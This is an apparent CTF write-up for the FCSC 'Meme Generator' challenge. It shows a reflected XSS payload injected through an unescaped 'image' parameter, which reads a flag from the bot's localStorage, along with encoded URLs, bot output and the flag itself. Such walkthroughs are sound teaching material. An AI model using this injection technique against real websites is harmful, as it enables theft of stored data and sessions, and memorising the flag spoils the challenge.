# Meme Generator


## Challenge Statement

This meme generation application is vulnerable to a very classic technique. The bot accessible via the service holds the flag in its localStorage.

- Web application: [meme-generator.fcsc.fr](https://meme-generator.fcsc.fr/)
- Bot: `nc chall.fcsc.fr 2210` (the bot cannot access the internet)

---

## Solution

1.  **Goal:** Get the flag from the bot's `localStorage` on the `CHALLENGE_HOST` domain.
2.  **Vulnerability Class:** The prompt mentions a "très classique" technique and `localStorage`. The bot visits a user-provided URL after setting the flag on the challenge domain. This strongly suggests a client-side vulnerability, likely Cross-Site Scripting (XSS), targeting the page the bot visits. We need to inject JavaScript that runs *on* the challenge domain.
3.  **Application Analysis:**
    *   The web application takes `image` and `text` parameters via GET.
    *   It displays an image using `<img src="img/<?php echo $_GET['image']; ?>" ...>`.
    *   It displays text using `<div class="meme-text"><?php echo strtoupper($_GET['text']); ?></div>`.
    *   The vulnerable code block is only executed if *both* `image` and `text` GET parameters are set.
    *   The `image` parameter is directly echoed within an `<img>` tag's `src` attribute, preceded by `img/`. This is a classic Reflected XSS vulnerability point. We can break out of the `src` attribute and inject arbitrary HTML/attributes.
    *   The `text` parameter is also echoed, but `strtoupper()` is applied, making standard HTML/JavaScript tag injection (`<script>`, `<img>`, etc.) difficult.
4.  **Exploitation Strategy:**
    *   Focus on the `image` parameter. We can inject an `onerror` attribute into the `<img>` tag. This attribute executes JavaScript if the image fails to load (which we can easily make happen).
    *   The bot visits *our* provided URL. To access the `localStorage` of `CHALLENGE_HOST`, our provided URL *must* be on the `CHALLENGE_HOST` origin (e.g., `http://chall/`).
    *   The bot helpfully tells us: "Every console.log usage on the bot will be sent back to you :)". This is our exfiltration channel.
    *   The JavaScript payload needs to read `localStorage.getItem('flag')` and output it using `console.log()`.
5.  **Crafting the Payload:**
    *   The injection goes into the `image` parameter.
    *   We need to close the `src` attribute and inject `onerror`. A simple way is to provide `x"` to close `src="img/`. Then add `onerror="...our payload..."`.
    *   Full injection string for the `image` parameter: `x" onerror="console.log(localStorage.getItem('flag'))"`
    *   When this is echoed into the `<img>` tag, it becomes `<img src="img/x" onerror="console.log(localStorage.getItem('flag'))" class="img-fluid">`. `img/x` won't exist, triggering the `onerror`.
    *   We also need the `text` parameter to be set for the vulnerable code to run. The content doesn't matter, let's use `a`.
6.  **Constructing the Malicious URL:**
    *   The base URL the bot understands is `http://chall/`.
    *   We need to use GET parameters: `image` and `text`.
    *   URL: `http://chall/?image=x" onerror="console.log(localStorage.getItem('flag'))"&text=a`
    *   It's good practice to URL-encode special characters in parameter values, although often not strictly necessary for basic cases like this. Let's encode the quotes and parentheses for robustness:
        *   `"` -> `%22`
        *   `(` -> `%28`
        *   `)` -> `%29`
        *   `=` inside the value -> `%3D`
    *   Encoded payload for `image`: `x%22%20onerror%3D%22console.log%28localStorage.getItem%28%27flag%27%29%29%22` (adding `%20` for the space is optional but clearer). Let's simplify and remove the space after `x"`: `x%22onerror%3D%22console.log%28localStorage.getItem%28%27flag%27%29%29%22`
    *   The final URL to give the bot: `http://chall/?image=x%22onerror%3D%22console.log%28localStorage.getItem%28%27flag%27%29%29%22&text=a`

7.  **Execution:**
    *   Connect to the bot: `nc chall.fcsc.fr 2210`
    *   When prompted for the URL, paste the crafted URL.
    *   The bot will visit `http://chall/`, set the flag, then visit your URL.
    *   When visiting your URL, the server will render the page with the injected `<img>` tag.
    *   The browser will execute the `onerror` handler.
    *   The `console.log()` output will be sent back to your netcat session.

**Steps to Solve:**

1.  Open a terminal.
2.  Connect to the bot: `nc chall.fcsc.fr 2210`
3.  Wait for the prompt: `Please provide the URL you want to visit:`
4.  Paste the following URL and press Enter:
    `http://meme-generator/?image=x%22onerror%3D%22console.log%28localStorage.getItem%28%27flag%27%29%29%22&text=a`
5.  Wait for the bot to process. You should receive the flag as output in your terminal.

**Example Output (what you might see after pasting the URL):**

```
(base) salaheddinealabouch@Salah-Eddines-MacBook-Pro Persist % nc chall.fcsc.fr 2210
==========
Tips: Every console.log usage on the bot will be sent back to you :)
==========

Please provide the URL you want to visit:
http://meme-generator/?image=x%22onerror%3D%22console.log%28localStorage.getItem%28%27flag%27%29%29%22&text=a

Starting the browser...
[T1]> New tab created!
[T1]> navigating        | about:blank

Setting the flag in the localStorage for http://meme-generator/...
[T1]> navigating        | http://meme-generator/

Going to the user provided link...
[T1]> navigating        | http://meme-generator/?image=x%22onerror%3D%22console.log%28localStorage.getItem%28%27flag%27%29%29%22&text=a
[T1]> console.error     | Failed to load resource: the server responded with a status of 404 (Not Found)
[T1]> console.log       | FCSC{7ceb95bed1244c477d15967098cb71ec98e98678c2f2375de098e5919dba0bd8}

Leaving o/
[T1]> Tab closed!
[T0]> Tab closed!

```

The line starting with `FCSC{` is the flag.

---

## Flag

FCSC{7ceb95bed1244c477d15967098cb71ec98e98678c2f2375de098e5919dba0bd8}

---
